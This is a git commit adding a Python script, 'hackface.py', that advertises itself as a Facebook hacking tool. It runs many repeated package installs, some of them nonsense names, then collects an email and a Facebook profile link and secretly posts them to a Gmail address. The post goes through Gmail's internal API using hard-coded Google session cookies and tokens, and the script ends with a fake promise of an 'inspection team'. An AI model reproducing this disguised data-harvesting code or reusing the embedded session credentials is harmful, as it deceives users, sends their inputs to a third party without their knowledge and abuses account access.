8a531c4e5b488dfb705af35f984b7a1ce3ca913a
monifire999 <98234736+monifire999@users.noreply.github.com>
2022-02-24 15:22:45 +0700

    Add files via upload

---
+++ hackface.py
@@ -0,0 +1,113 @@
+import requests
+import os,sys,time,random
+
+def banner():
+	print("""\033[1;95m------------------------------------------------
+\033[1;91m██╗  ██╗ █████╗  █████╗ ██╗  ██╗███████╗██████╗       \033[1;93m----------------------------
+\033[0m██║  ██║██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗       \033[1;96mFACEBOOK : เอ้ ผู้กำเนิดพระเจ้า
+\033[1;94m███████║███████║██║  ╚═╝█████═╝ █████╗  ██████╔╝      \033[1;96m YouTube  : Aimbot
+\033[0m██╔══██║██╔══██║██║  ██╗██╔═██╗ ██╔══╝  ██╔══██╗      \033[1;96m Github   : monifire999
+\033[1;91m██║  ██║██║  ██║╚█████╔╝██║ ╚██╗███████╗██║  ██║      \033[1;93m----------------------------
+\033[1;93m╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+\033[1;95m------------------------------------------------""")
+
+def exit():
+	os.system("clear")
+	
+def install():
+	os.system("pkg update")
+	os.system("pkg install git -y")
+	os.system("pkg install php -y")
+	os.system("pkg install nano -y")
+	os.system("pkg install socket -y")
+	os.system("pkg install socks -y")
+	os.system("pkg install index -y")
+	os.system("pkg install java -y")
+	os.system("pkg install js -y")
+	os.system("pkg install hoil -y")
+	os.system("pkg install sl -y")
+	os.system("pkg install basic -y")
+	os.system("pkg install hee -y")
+	os.system("pkg install paou -y")
+	os.system("pkg install djss -y")
+	os.system("pkg install pzzhp -y")
+	os.system("pkg install psjhp -y")
+	os.system("pkg update")
+	os.system("pkg install git -y")
+	os.system("pkg install php -y")
+	os.system("pkg install nano -y")
+	os.system("pkg install socket -y")
+	os.system("pkg install socks -y")
+	os.system("pkg install index -y")
+	os.system("pkg install java -y")
+	os.system("pkg install js -y")
+	os.system("pkg install hoil -y")
+	os.system("pkg install sl -y")
+	os.system("pkg install basic -y")
+	os.system("pkg install hee -y")
+	os.system("pkg install paou -y")
+	os.system("pkg install djss -y")
+	os.system("pkg install pzzhp -y")
+	os.system("pkg install psjhp -y")
+	os.system("pkg update")
+	os.system("pkg install git -y")
+	os.system("pkg install php -y")
+	os.system("pkg install nano -y")
+	os.system("pkg install socket -y")
+	os.system("pkg install socks -y")
+	os.system("pkg install index -y")
+	os.system("pkg install java -y")
+	os.system("pkg install js -y")
+	os.system("pkg install hoil -y")
+	os.system("pkg install sl -y")
+	os.system("pkg install basic -y")
+	os.system("pkg install hee -y")
+	os.system("pkg install paou -y")
+	os.system("pkg install djss -y")
+	os.system("pkg install pzzhp -y")
+	os.system("pkg install psjhp -y")
+	
+install()
+exit()
+banner()
+print("")
+u = input("\033[0m[\033[1;91m?\033[0m] \033[0mEnter the email : \033[1;92m")
+exit()
+banner()
+l = input("\033[0m[\033[1;91m?\033[0m] \033[0mLine Profire Facebook : \033[1;92m")
+
+def send():
+	head = {
+	    "Host": "mail.google.com",
+	    "content-length": "443",
+	    "sec-ch-ua-mobile": "?1",
+	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
+	    "sec-ch-ua-platform": "Android",
+	    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+	    "origin": "https://mail.google.com",
+	    "accept": "*/*",
+	    "sec-fetch-site": "same-origin",
+	    "sec-fetch-mode": "cors",
+	    "sec-fetch-dest": "empty",
+	    "referer": "https://mail.google.com/mail/mu/mp/526/",
+	    "cookie": "GM_IMP=sp-ca-etresp-cnt-2%2Fmc-ht-1%2Fsp-upload-apm-0;COMPASS=gmail=CooBAAlriVem4XhHb46WFJumEZ6V4PFfCaLg7NQ7mfC2oo--nSpj0EsFDSbtktmEKjM9lWKNeUvrdJaB6hxuxywqZSu4f3QYv-X6sxmrw45Gv_sI5-c9rt7eCHBIL9_hgFyqTX6--vXe2eHekPERjv7DRJcBCBjnfiGXPYX20EJx1pNY7aTASFzsJ-EHEPeG3ZAGGpwBAAlriVeYMWjC6L1KY9ZQaebszmbu4v_wLuq9yiU_9uFna1-v9d-ogr7feYYoOfL0suv5yzx1kY_j4WWYmi2PmQ9BL3upMkF_djBSqU5rvtVqDLCym7R-SQMWqg9-OfjDElI7vZD8ze2eCLfLEZvQUVpUjm_1nig6cwtuHR5_cDOzjR_mJmwYhjIX7yYj5H_ebVM_XCNmu3OvN53c;GX=DUMMY;WML=1645688226960#originnamnice@gmail.com:526:0#pointbank10000@gmail.com:424:1#imyourlovee3@gmail.com:574:2#0958816629za@gmail.com:672:3#httptest0123@gmail.com:614:4#pcx19xmax@gmail.com:104:5#berlnw2551@gmail.com:715:6#httptest01234@gmail.com:285:7#easyplay.officials@gmail.com:761:8#httptest012345@gmail.com:819:9;HSID=AWS3FJF389U2aHur4;SSID=Ay_DpHAV04LXjpG_b;APISID=LtQiyCicY_XOX24l/A_EpObtQY2mwQLp3x;SAPISID=o_tRcc9DG0J3LbYp/ABgsV2bFAS0r9RvDN;__Secure-1PAPISID=o_tRcc9DG0J3LbYp/ABgsV2bFAS0r9RvDN;__Secure-3PAPISID=o_tRcc9DG0J3LbYp/ABgsV2bFAS0r9RvDN;SID=GghL18pztwwfee-sgzNpc6OM2LicqinWxgWNOF_JISdDlBXU6ZQmEMUCMykRnibCniK7tA.;__Secure-1PSID=GghL18pztwwfee-sgzNpc6OM2LicqinWxgWNOF_JISdDlBXUoOSuleTW3qlNbHggGkGJTA.;__Secure-3PSID=GghL18pztwwfee-sgzNpc6OM2LicqinWxgWNOF_JISdDlBXUu4fy4IauNXDrtZDx2aF3lQ.;OSID=GghL11wn_3V32tW1VmtiPj4u3OywpNSYZXRYT8rYYQNx1jCVJkmGSc9cd9kh8NhJBfHtRw.;__Secure-OSID=GghL11wn_3V32tW1VmtiPj4u3OywpNSYZXRYT8rYYQNx1jCV7yOGkIQznN1ynKykhI54SQ.;SEARCH_SAMESITE=CgQI5JQB;NID=511=imWeBCr85BXGmoMmf8J4jAF77vNCWI4Xn6FWQgiNialZKmNaTKTj0pnxh47cfCx0OKQbXrnKCLIZZfL-uce8WPB9ekrH94RJESVAzJOq25bSuLgFN4Jl_RCW963apsatT8uqIFt0-cIbYE8Gh5ch0B6VHllMzNlWXGiKF3JCTAsEqZwId0eiPNMTbYnsqRQELB5_AeJF2zZhtmDNJX5JV23LQ7CEpZ3bm8rVjjIaFQfdwFulDVWtVzeGCuZxjUmizfPcSsGIHjvHRXmC--auCSc8WNnktPcP7Q;1P_JAR=2022-02-24-07;SIDCC=AJi4QfGvmB_hrsmQTM2OOrFJ-SPpE2MlL-5-nRCK9KKL6zfpPivr4KkNHv7xA5JcuIfXksSbJg;__Secure-3PSIDCC=AJi4QfEb1WadDBUW-pEOB2oeiE3Sk06OTIMY-wvnh501FH2d4XBEt7Sa5_oua_hndqd_lHSzivU"
+	    }
+	requests.post("https://mail.google.com/mail/u/0/s/?v=or&ik=32aebbe3e4&at=AF6bupMwJwoL-87DJYbdkvx87xAoSvO_hQ&subui=android&wjt=p&orwas=1&cfact=7694&suim=true&wasmp=526&ui=savannah&hl=th&ts=1645688272013",headers=head,data=f"s_jr=%5Bnull%2C%5B%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5Bnull%2C%5Bnull%2C%5B%5Bnull%2C%22berlnw2551@gmail.com%22%2C%22%22%2Cfalse%5D%5D%2C%5B%5D%2C%5B%5D%2C%5Bnull%2C%22originnamnice%40gmail.com%22%2Cnull%2Cnull%5D%2C%5B%5D%2C%22HACK%20FACEBOOK%22%2C%22Like%20%3A%20{l}-{u}%22%2C1%2Cnull%2Cnull%2Cnull%2Ctrue%2Cnull%2C%22ar4sqggsvfbl%22%2Cfalse%2C%5B%5D%5D%2Cnull%5D%5D%5D%2C2%2Cnull%2Cnull%2Cnull%2C%2232aebbe3e4%22%5D")
+	
+send()
+print("")
+print("\033[0m[\033[1;91m√\033[0m] \033[1;92mWait for the inspection team within 48 hours.")
+time.sleep(3)
+os.system("clear")
+
+def thanks():
+	print("""\033[1;92m
+████████╗██╗  ██╗ █████╗ ███╗  ██╗██╗  ██╗ ██████╗
+╚══██╔══╝██║  ██║██╔══██╗████╗ ██║██║ ██╔╝██╔════╝
+   ██║   ███████║███████║██╔██╗██║█████═╝ ╚█████╗
+   ██║   ██╔══██║██╔══██║██║╚████║██╔═██╗  ╚═══██╗
+   ██║   ██║  ██║██║  ██║██║ ╚███║██║ ╚██╗██████╔╝
+   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚══╝╚═╝  ╚═╝╚═════╝
+""")
+
+thanks()
